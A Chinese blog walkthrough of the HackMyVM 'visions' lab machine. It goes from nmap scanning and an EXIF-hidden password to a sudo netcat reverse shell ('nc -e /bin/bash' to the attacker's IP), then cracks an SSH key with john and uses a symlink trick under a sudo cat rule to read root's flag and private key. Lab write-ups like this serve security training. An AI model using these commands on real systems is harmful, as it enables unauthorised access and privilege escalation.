---
{"dg-publish":true,"title":"hackmyvm_visions","tags":["blog"],"dg-path":"安全/靶机/hackmyvm_visions.md","permalink":"/安全/靶机/hackmyvm_visions/","dgPassFrontmatter":true}
---

# 主机发现

```sh
┌──(root㉿kali)-[~/workspace/pentest/Observer]
└─# arp-scan --interface=eth1 --localnet
Interface: eth1, type: EN10MB, MAC: 00:0c:29:8e:b5:08, IPv4: 192.168.124.27
Starting arp-scan 1.10.0 with 256 hosts (https://github.com/royhills/arp-scan)
192.168.124.1   88:2a:5e:21:1b:ef       New H3C Technologies Co., Ltd
192.168.124.8   10:a5:1d:71:1b:f5       Intel Corporate
192.168.124.32  08:00:27:6b:60:64       PCS Systemtechnik GmbH
192.168.124.7   4e:f4:82:76:df:78       (Unknown: locally administered)

6 packets received by filter, 0 packets dropped by kernel
Ending arp-scan 1.10.0: 256 hosts scanned in 2.641 seconds (96.93 hosts/sec). 4 responded

┌──(root㉿kali)-[~/workspace/pentest/Observer]
└─# nmap -sT -min-rate 10000 -p- 192.168.124.32
Starting Nmap 7.95 ( https://nmap.org ) at 2025-02-09 02:22 EST
Nmap scan report for 192.168.124.32 (192.168.124.32)
Host is up (0.0083s latency).
Not shown: 63505 closed tcp ports (conn-refused), 2028 filtered tcp ports (no-response)
PORT   STATE SERVICE
22/tcp open  ssh
80/tcp open  http
MAC Address: 08:00:27:6B:60:64 (PCS Systemtechnik/Oracle VirtualBox virtual NIC)

Nmap done: 1 IP address (1 host up) scanned in 58.12 seconds
```

开了两个端口，`22,80`

```sh
┌──(root㉿kali)-[~/workspace/pentest/Observer]
└─# nmap -sT -sC -sV -O -p22,80 192.168.124.32
Starting Nmap 7.95 ( https://nmap.org ) at 2025-02-09 02:23 EST
Nmap scan report for 192.168.124.32 (192.168.124.32)
Host is up (0.0023s latency).

PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 7.9p1 Debian 10+deb10u2 (protocol 2.0)
| ssh-hostkey:
|   2048 85:d0:93:ff:b6:be:e8:48:a9:2c:86:4c:b6:84:1f:85 (RSA)
|   256 5d:fb:77:a5:d3:34:4c:46:96:b6:28:a2:6b:9f:74:de (ECDSA)
|_  256 76:3a:c5:88:89:f2:ab:82:05:80:80:f9:6c:3b:20:9d (ED25519)
80/tcp open  http    nginx 1.14.2
|_http-server-header: nginx/1.14.2
|_http-title: Site doesn't have a title (text/html).
MAC Address: 08:00:27:6B:60:64 (PCS Systemtechnik/Oracle VirtualBox virtual NIC)
Warning: OSScan results may be unreliable because we could not find at least 1 open and 1 closed port
Device type: general purpose|router
Running: Linux 4.X|5.X, MikroTik RouterOS 7.X
OS CPE: cpe:/o:linux:linux_kernel:4 cpe:/o:linux:linux_kernel:5 cpe:/o:mikrotik:routeros:7 cpe:/o:linux:linux_kernel:5.6.3
OS details: Linux 4.15 - 5.19, OpenWrt 21.02 (Linux 5.4), MikroTik RouterOS 7.2 - 7.5 (Linux 5.6.3)
Network Distance: 1 hop
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 11.22 seconds

```



# web渗透


```sh
┌──(root㉿kali)-[~/workspace/pentest/Observer]
└─# curl 192.168.124.32
<!--
Only those that can see the invisible can do the imposible.
You have to be able to see what doesnt exist.
Only those that can see the invisible being able to see whats not there.
-alicia -->

...

 <img src="white.png">

```

不知道啥意思，目录扫描一下

```sh
┌──(root㉿kali)-[~/workspace/pentest/Observer]
└─# dirb http://192.168.124.32/ -X .php,.html,.txt,.zip,.jpg,.png,.gif

-----------------
DIRB v2.22
By The Dark Raver
-----------------

START_TIME: Sun Feb  9 02:28:35 2025
URL_BASE: http://192.168.124.32/
WORDLIST_FILES: /usr/share/dirb/wordlists/common.txt
EXTENSIONS_LIST: (.php,.html,.txt,.zip,.jpg,.png,.gif) | (.php)(.html)(.txt)(.zip)(.jpg)(.png)(.gif) [NUM = 7]

-----------------

GENERATED WORDS: 4612

---- Scanning URL: http://192.168.124.32/ ----
+ http://192.168.124.32/index.html (CODE:200|SIZE:380)
+ http://192.168.124.32/white.png (CODE:200|SIZE:12655)

-----------------
END_TIME: Sun Feb  9 02:31:50 2025
DOWNLOADED: 32284 - FOUND: 2
```


就扫出来最后那个图片，大概就是index.html那个图片
提示中的“不可见”我才也就是那个图片

```sh
┌──(root㉿kali)-[~/workspace/pentest/visions]
└─# exiftool white.png
ExifTool Version Number         : 13.10
File Name                       : white.png
Directory                       : .
File Size                       : 13 kB
File Modification Date/Time     : 2021:04:19 05:05:04-04:00
File Access Date/Time           : 2025:02:09 02:33:57-05:00
File Inode Change Date/Time     : 2025:02:09 02:33:57-05:00
File Permissions                : -rw-r--r--
File Type                       : PNG
File Type Extension             : png
MIME Type                       : image/png
Image Width                     : 1920
Image Height                    : 1080
Bit Depth                       : 8
Color Type                      : RGB with Alpha
Compression                     : Deflate/Inflate
Filter                          : Adaptive
Interlace                       : Noninterlaced
Background Color                : 255 255 255
Pixels Per Unit X               : 11811
Pixels Per Unit Y               : 11811
Pixel Units                     : meters
Modify Date                     : 2021:04:19 08:26:43
Comment                         : pw:ihaveadream
Image Size                      : 1920x1080
Megapixels                      : 2.1

```

注意到`Comment`的内容`pw:ihaveadream`大概就是密码`ihaveadream`
和`index.html`页面注释中最后的信息（猜测为用户名）进行ssh登陆测试

```sh
┌──(root㉿kali)-[~/workspace/pentest/visions]
└─# ssh alicia@192.168.124.32
The authenticity of host '192.168.124.32 (192.168.124.32)' can't be established.
ED25519 key fingerprint is SHA256:bygz7T6Gfa+JkC+fYDCq3G3A/WbnZLNIOtkpFpo0R6E.
This key is not known by any other names.
Are you sure you want to continue connecting (yes/no/[fingerprint])? yes
Warning: Permanently added '192.168.124.32' (ED25519) to the list of known hosts.
alicia@192.168.124.32's password:
Linux visions 4.19.0-14-amd64 #1 SMP Debian 4.19.171-2 (2021-01-30) x86_64

The programs included with the Debian GNU/Linux system are free software;
the exact distribution terms for each program are described in the
individual files in /usr/share/doc/*/copyright.

Debian GNU/Linux comes with ABSOLUTELY NO WARRANTY, to the extent
permitted by applicable law.
alicia@visions:~$id
uid=1001(alicia) gid=1001(alicia) groups=1001(alicia)
```

成功


# 提权-1

```sh
alicia@visions:~$ ls /home
alicia  emma  isabella  sophia
alicia@visions:~$ sudo -l
Matching Defaults entries for alicia on visions:
    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin

User alicia may run the following commands on visions:
    (emma) NOPASSWD: /usr/bin/nc
```

直接把shell反弹过去就行吧
```sh
sudo -u emma /usr/bin/nc -e /bin/bash 192.168.124.27 8080


┌──(root㉿kali)-[~/workspace/pentest/Observer]
└─# nc -lvnp 8080
listening on [any] 8080 ...
connect to [192.168.124.27] from (UNKNOWN) [192.168.124.32] 40924
id
uid=1000(emma) gid=1000(emma) groups=1000(emma),24(cdrom),25(floppy),29(audio),30(dip),44(video),46(plugdev),109(netdev)

```


# 提权-2

```sh
emma@visions:~$ cat note.txt
cat note.txt
I cant help myself.
```
我不能帮助我自己？难道下一步提权只靠这个用户无法完成？


```sh
emma@visions:~$ sudo -l
sudo -l

We trust you have received the usual lecture from the local System
Administrator. It usually boils down to these three things:

    #1) Respect the privacy of others.
    #2) Think before you type.
    #3) With great power comes great responsibility.

[sudo] password for emma: 
```
需要密码，我们暂时没有

//不知道下一步应该怎么做了，去看了眼WP，发现图片中还有信息
![Pasted image 20250209160148.png](/img/user/picture/Pasted%20image%2020250209160148.png)

```txt
sophia/seemstobeimpossible
```

```sh
┌──(root㉿kali)-[~/workspace/pentest/Observer]
└─# ssh sophia@192.168.124.32
sophia@192.168.124.32's password:
Linux visions 4.19.0-14-amd64 #1 SMP Debian 4.19.171-2 (2021-01-30) x86_64

The programs included with the Debian GNU/Linux system are free software;
the exact distribution terms for each program are described in the
individual files in /usr/share/doc/*/copyright.

Debian GNU/Linux comes with ABSOLUTELY NO WARRANTY, to the extent
permitted by applicable law.
sophia@visions:~$id
uid=1002(sophia) gid=1002(sophia) groups=1002(sophia)
```

```sh
sophia@visions:~$ sudo -l
Matching Defaults entries for sophia on visions:
    env_reset, mail_badpass,
    secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin

User sophia may run the following commands on visions:
    (ALL : ALL) NOPASSWD: /usr/bin/cat /home/isabella/.invisible
sophia@visions:~$ sudo /usr/bin/cat /home/isabella/.invisible
-----BEGIN OPENSSH PRIVATE KEY-----
b3BlbnNzaC1rZXktdjEAAAAACmFlczI1Ni1jdHIAAAAGYmNyeXB0AAAAGAAAABBMekPa3i
1sMQAToGnurcIWAAAAEAAAAAEAAAEXAAAAB3NzaC1yc2EAAAADAQABAAABAQDNAxlJldzm
IgVNFXbjg51CS4YEuIxM5gQxjafNJ/rzYw0sOPkT9sL6dYasQcOHX1SYxk5E+qD8QNZQPZ
GfACdWDLwOcI4LLME0BOjARwmrpU4mJXwugX4+RbGICFMgY8ZYtKXEIoF8dwKPVsBdoIwi
lgHyfJD4LwkqfV6mvlau+XRZZBhvlNP10F0SAAZqBaA9y7hRWJO/XcCZC6HzJKzloAL2Xw
GvAMzgtPH/wj06NoOFjmVGMfmmHzCwgc+fLOeXXYzFeRNPH3cVExc+BnB8Ju6CFa6n7VBV
HLCYJ3CcgKnxv6OwVtkoDi0UEFUOefELQV7fZ+g1sZt/+2XPsmcZAAAD0E8RIvVF4XlKJq
INtHdJ5QJZCuq2ufynbPNiHF53PqSlmC//OkQZMWgJ5DcbzMJ92IqxRgjilZZUOUbE/SFI
PViwmpRWIGAhlyoPXyV513ukhb4UngYlgCP9qC4Rbn+Tp9Fv7lnAoD0DsmwITM2e/Z65AD
/i/BqrJ6scNEN0q+qNr3zOVljMZx+qy8cbuDn9Tbq2/N+mcoEysfjfOaoJIgVJnLx1XE6r
+Y9UcRyPAYs+5TB1Nz/fpnBo7vesOu5XLUqCBCphFGmdMCdSGYZAweitjQ+Mq36hQmCtSs
Dwcbjg8vy5LJ+mtJXA7QhqgAfXWnLLny4NeCztUnTG0NLjbLR6M5e+HSsi2EqDYoGNpWld
l4YzVPQoFMIaUJOGTc+VfkMWbQhzpiu66/Du8dwhC+p6QSmwhV/M70eWaH2ZVjK3MThg9K
CVugFsLxioqlp/rnE1oq7apTBX6FOjwz0ne+ytTVOQrHuPTs2QL4PlCvhPRoIuqydleFs4
rdtzE6b46PexXlupewywiO5AVzbfSRAlCYwiwV42xGpYsNcKhdUY+Q9d9i9yudjIFoicrA
MG9hxr7/DJqEY311kTglDEHqQB3faErYsYPiOL9TTZWnPLZhClrPbiWST5tmMWxgNE/AKY
R7mKGDBOMFPlBAjGuKqR6zk5DEc3RzJnvGjUlaT3zzdVmxD8SpWtjzS6xHaSw/WOvB0lsg
Dhf+Gc7OWyHm2qk+OMK9t0/lbIDfn3su0EHwbPjYTT3xk7CtG4AwiSqPve1t9bOdzD9w9r
TM7am/2i/BV1uv28823pCuYZmNG7hu5InzNC/3iTROraE31Qqe3JCNwxVDcHqb8s6gTN+J
q6OyZdvNNiVQUo1l7hNUlg4he4q1kTwoyAATa0hPKVxEFEISRtaQln5Ni8V+fos8GTqgAr
HH2LpFa4qZKTtUEU0f54ixjFL7Lkz6owbUG7Cy+LuGDI1aKJRGCZwd5LkStcF/MAO3pulc
MsHiYwmXT3lNHhkAd1h05N2yBzXaH+M3sX6IpNtq+gi+9F443Enk7FBRFLzxdJ+UT40f6E
+gyA2nBGygNhvQHXcu36A8BoE+IF7YVpdfDmYJffbTujtBUj2vrdsqVvtGUxf0vj9/Sv+J
HN9Yk2giXN8VX7qhcyLzUktmdfgd6JNAx+/P7Kh3HV5oWk1Da+VJS+wtCg/oEVSVyrEOpe
skV8zcwd+ErNODEHTUbD/nDARX8GeV158RMtRdZ5CJZSFjBz2oPDPDVpZMFNhENAAwPnrJ
KD/C2J6CKylbopifizfpEkmVqJRms=
-----END OPENSSH PRIVATE KEY-----

```

看样子像是`isabella`的私钥

```sh
┌──(root㉿kali)-[~/workspace/pentest/visions]
└─# ssh -i id1 isabella@192.168.124.32
Enter passphrase for key 'id1':
```
e,私钥还有密码。。。

先去别处看看


```sh
sophia@visions:~$ ls -al
total 32
drwxr-xr-x 3 sophia sophia 4096 Apr 19  2021 .
drwxr-xr-x 6 root   root   4096 Apr 19  2021 ..
-rw-r--r-- 1 sophia sophia  220 Apr 19  2021 .bash_logout
-rw-r--r-- 1 sophia sophia 3526 Apr 19  2021 .bashrc
-rwx--x--x 1 sophia sophia 1920 Apr 19  2021 flag.sh
drwxr-xr-x 3 sophia sophia 4096 Apr 19  2021 .local
-rw-r--r-- 1 sophia sophia  807 Apr 19  2021 .profile
-rw------- 1 sophia sophia   18 Apr 19  2021 user.txt
sophia@visions:~$ cat user.txt
hmvicanseeforever
sophia@visions:~$ ./flag.sh
\033[0;35m
                                   .     **
                                *           *.
                                              ,*
                                                 *,
                         ,                         ,*
                      .,                              *,
                    /                                    *
                 ,*                                        *,
               /.                                            .*.
             *                                                  **
             ,*                                               ,*
                **                                          *.
                   **                                    **.
                     ,*                                **
                        *,                          ,*
                           *                      **
                             *,                .*
                                *.           **
                                  **      ,*,
                                     ** *,     \033[0m
-------------------------
\nPWNED HOST: visions
\nPWNED DATE: Sun 09 Feb 2025 03:08:36 AM EST
\nWHOAMI: uid=1002(sophia) gid=1002(sophia) groups=1002(sophia)
\nFLAG: hmvicanseeforever
\n------------------------

sophia@visions:~$ cat ./flag.sh
#!/bin/bash
echo '\033[0;35m
                                   .     **
                                *           *.
                                              ,*
                                                 *,
                         ,                         ,*
                      .,                              *,
                    /                                    *
                 ,*                                        *,
               /.                                            .*.
             *                                                  **
             ,*                                               ,*
                **                                          *.
                   **                                    **.
                     ,*                                **
                        *,                          ,*
                           *                      **
                             *,                .*
                                *.           **
                                  **      ,*,
                                     ** *,     \033[0m'



echo "-------------------------"
echo "\nPWNED HOST: $(hostname)"
echo "\nPWNED DATE: $(date)"
echo "\nWHOAMI: $(id)"
echo "\nFLAG: $(cat root.txt 2>/dev/null || cat user.txt 2>/dev/null || echo "Keep trying.")"
echo "\n------------------------"
```

好吧，也没什么东西，去破解一下密码吧

```sh
┌──(root㉿kali)-[~/workspace/pentest/visions]
└─# john --wordlist=/usr/share/wordlists/rockyou.txt hash
Using default input encoding: UTF-8
Loaded 1 password hash (SSH, SSH private key [RSA/DSA/EC/OPENSSH 32/64])
Cost 1 (KDF/cipher [0=MD5/AES 1=MD5/3DES 2=Bcrypt/AES]) is 2 for all loaded hashes
Cost 2 (iteration count) is 16 for all loaded hashes
Will run 4 OpenMP threads
Press 'q' or Ctrl-C to abort, almost any other key for status
0g 0:00:02:08 0.01% (ETA: 2025-02-28 09:53) 0g/s 10.50p/s 10.50c/s 10.50C/s teacher..realmadrid
0g 0:00:08:30 0.03% (ETA: 2025-02-28 16:47) 0g/s 10.34p/s 10.34c/s 10.34C/s honeybunch..chapis
0g 0:00:12:25 0.04% (ETA: 2025-02-28 13:45) 0g/s 10.33p/s 10.33c/s 10.33C/s DRAGON..astros
invisible        (id1)
1g 0:00:18:11 DONE (2025-02-09 03:34) 0.000916g/s 10.35p/s 10.35c/s 10.35C/s merda..damnyou
Use the "--show" option to display all of the cracked passwords reliably
Session completed.

```


将`.invisible`替换一下
```sh
isabella@visions:~$ ls -al
total 28
drwxr-xr-x 3 isabella isabella 4096 Apr 19  2021 .
drwxr-xr-x 6 root     root     4096 Apr 19  2021 ..
-rw-r--r-- 1 isabella isabella  220 Apr 19  2021 .bash_logout
-rw-r--r-- 1 isabella isabella 3526 Apr 19  2021 .bashrc
-rw------- 1 isabella isabella 1876 Apr 19  2021 .invisible
-rw-r--r-- 1 isabella isabella  807 Apr 19  2021 .profile
drwx------ 2 isabella isabella 4096 Apr 19  2021 .ssh
isabella@visions:~$ rm .invisible
isabella@visions:~$ ln -sv /root/root.txt .invisible
'.invisible' -> '/root/root.txt'

```

```sh
sophia@visions:~$ sudo /usr/bin/cat /home/isabella/.invisible
hmvitspossible

```


所以到最后读取rootflag确实需要两个用户配合


想尝试拿一下rootshell
读一下有没有ssh私钥
```sh
sophia@visions:~$ sudo /usr/bin/cat /home/isabella/.invisible
-----BEGIN OPENSSH PRIVATE KEY-----
b3BlbnNzaC1rZXktdjEAAAAABG5vbmUAAAAEbm9uZQAAAAAAAAABAAABFwAAAAdzc2gtcn
NhAAAAAwEAAQAAAQEAyezVs6KCQ/KFWpEkzDWX3ns/X4lUnh6PnNC2IVg3ciVgLcWF//wb
vlQxI+juYu5qTKVEL1FhkNaas+MlQUxabzOv+SDnCck60BLQbZf46sYHQaTrDyu5zhIWWi
wgPjmic/Ykd2qIQyIpyy9Ru4DiVK4RWLZWM28kb6eB99JTt4GSVEhraJ08hKsgaOi+skNg
S4QG85kG4ghmA1yJpPwzzpIdG4HUic63OXgy+z+pVB5oIEp0YXrCKMN/lBngZjZb9/+0S1
ljKzdcq7m1TOQ1Y04YJNMrxvPJ75d8U5s+m6cRxx5F3dX7oTVmErEAxFmJjdWVChzh81Ca
OnicNjHgrQAAA8hmM8ISZjPCEgAAAAdzc2gtcnNhAAABAQDJ7NWzooJD8oVakSTMNZfeez
9fiVSeHo+c0LYhWDdyJWAtxYX//Bu+VDEj6O5i7mpMpUQvUWGQ1pqz4yVBTFpvM6/5IOcJ
yTrQEtBtl/jqxgdBpOsPK7nOEhZaLCA+OaJz9iR3aohDIinLL1G7gOJUrhFYtlYzbyRvp4
H30lO3gZJUSGtonTyEqyBo6L6yQ2BLhAbzmQbiCGYDXImk/DPOkh0bgdSJzrc5eDL7P6lU
HmggSnRhesIow3+UGeBmNlv3/7RLWWMrN1yrubVM5DVjThgk0yvG88nvl3xTmz6bpxHHHk
Xd1fuhNWYSsQDEWYmN1ZUKHOHzUJo6eJw2MeCtAAAAAwEAAQAAAQEAiCmVXYHLN8h1VkIj
vzSwiU0wydqQXeOb0hIHjuqu0OEVPyhAGQNHLgwV6vIqtjmxIqgbF5FYKlQclAsq1yKGpR
AErQkb4sR4TVEyjYR6TM5mnER6YYuJysT1n667u1ogCvRDWOdUpXiHGEV7ZuYdOR78AYdL
D3n15vjcsmF5JHcftHOxnXraX7JqGXNCoRsMLT/yUOl02ClHsjFql1NTI/Br0GA4xhM/16
RHoRu1itOlWoyF4XSpSUDHW0RVQ/0gm/GyAc9QF6EWZXHfMfW07JvkeQLlndVbnItQ9a3v
ICAAh6zOZWVXpbhCPjjfaWTnwHhhSE3vfxMQQNTJnEghnQAAAIEAjAEzb6Xp6VV1RRaJR3
/Gxo0BRIbPJXdRXpDI3NO4Nvtzv8fX3muV/i+dgYPNqa7cwheSJZX9S7RzXsZTZn1Ywbdw
ahYTVyE9B4Nsen5gekylb59tNwPpCR8sJo6ZIL1GpmkEug+r+0YZyqpZXpG5uhCaSLX1fP
3UnkgqiKuzpvQAAACBAOOlQPW6pWXvULDsiUkilMXY0SNYLupMHJuqnWTuufyNfRthPQF2
gfWwXRjfDmzFoM9vVxJKKSd40696qbmTNnu7I4KyvXkF0OQ3IXIelQIiIcDpDbYd17g47J
IC6dHIQmUib3+whjeTvA5cc21y0EGNHoeNrlknE03dZHaIyfdPAAAAgQDjE3TE17PMEnd/
vzau9bBYZaoRt+eYmvXFrkU/UdRwqjS/LPWxwmpLOASW9x3bH/aiqNGBKeSe2k4C7MWWD5
tllkIbNEJNDtqQNt2NRvhDUOzAxca1C/IySuwoCAvoym5cpZ//EQ/OvWyZRwk3enReVmmd
x7Itf3P39SxqlP2pQwAAAAxyb290QHZpc2lvbnMBAgMEBQ==
-----END OPENSSH PRIVATE KEY-----

```

```sh
┌──(root㉿kali)-[~/workspace/pentest/Observer]
└─# nano id2

┌──(root㉿kali)-[~/workspace/pentest/Observer]
└─# chmod 600 id2

┌──(root㉿kali)-[~/workspace/pentest/Observer]
└─# ssh-keygen -y -f id2
ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABAQDJ7NWzooJD8oVakSTMNZfeez9fiVSeHo+c0LYhWDdyJWAtxYX//Bu+VDEj6O5i7mpMpUQvUWGQ1pqz4yVBTFpvM6/5IOcJyTrQEtBtl/jqxgdBpOsPK7nOEhZaLCA+OaJz9iR3aohDIinLL1G7gOJUrhFYtlYzbyRvp4H30lO3gZJUSGtonTyEqyBo6L6yQ2BLhAbzmQbiCGYDXImk/DPOkh0bgdSJzrc5eDL7P6lUHmggSnRhesIow3+UGeBmNlv3/7RLWWMrN1yrubVM5DVjThgk0yvG88nvl3xTmz6bpxHHHkXd1fuhNWYSsQDEWYmN1ZUKHOHzUJo6eJw2MeCt root@visions
```
好，这次没有加密

```sh
┌──(root㉿kali)-[~/workspace/pentest/Observer]
└─# ssh -i id2 root@192.168.124.32
Linux visions 4.19.0-14-amd64 #1 SMP Debian 4.19.171-2 (2021-01-30) x86_64

The programs included with the Debian GNU/Linux system are free software;
the exact distribution terms for each program are described in the
individual files in /usr/share/doc/*/copyright.

Debian GNU/Linux comes with ABSOLUTELY NO WARRANTY, to the extent
permitted by applicable law.
Last login: Mon Apr 19 05:24:08 2021
root@visions:~# id
uid=0(root) gid=0(root) groups=0(root)
root@visions:~#

```

成功！！！

# 总结

这个靶场还是挺基础的，也算是大部分靠自己做完的（除了图片处理漏掉一个信息）








